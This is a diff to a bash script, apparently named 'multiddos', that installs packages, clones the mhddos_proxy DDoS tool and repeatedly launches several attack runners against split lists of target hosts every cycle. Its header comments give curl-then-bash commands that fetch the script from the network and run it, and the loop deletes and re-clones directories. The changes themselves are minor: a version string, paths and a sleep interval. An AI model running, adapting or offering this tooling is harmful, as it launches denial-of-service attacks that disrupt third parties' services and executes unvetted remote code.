@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.9.9d\n"
+clear && echo -e "Loading... v0.9.9e\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -122,16 +122,16 @@ cat > auto_bash.sh << 'EOF'
 # Restart and update everything (mhddos_proxy and targets) every 30 minutes
 while true; do
     #install mhddos_proxy
-    rm -rf ~/multidd/mhddos_proxy;
+    rm -rf ~/multidd/mhddos_proxy/*;
     git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-    cd mhddos_proxy
+    cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
     if [[ $lite == "on" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods $args_to_pass -t 2000 &
     else
-        cd ~/multidd/targets/
+        #cd ~/multidd/targets/
         split -n 4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in N parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods $threads $args_to_pass &
         sleep 5 # to decrease load on cpu during simultaneous start
@@ -141,7 +141,7 @@ while true; do
         sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods $threads $args_to_pass &
     fi
-sleep 30
+sleep 60
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
 done
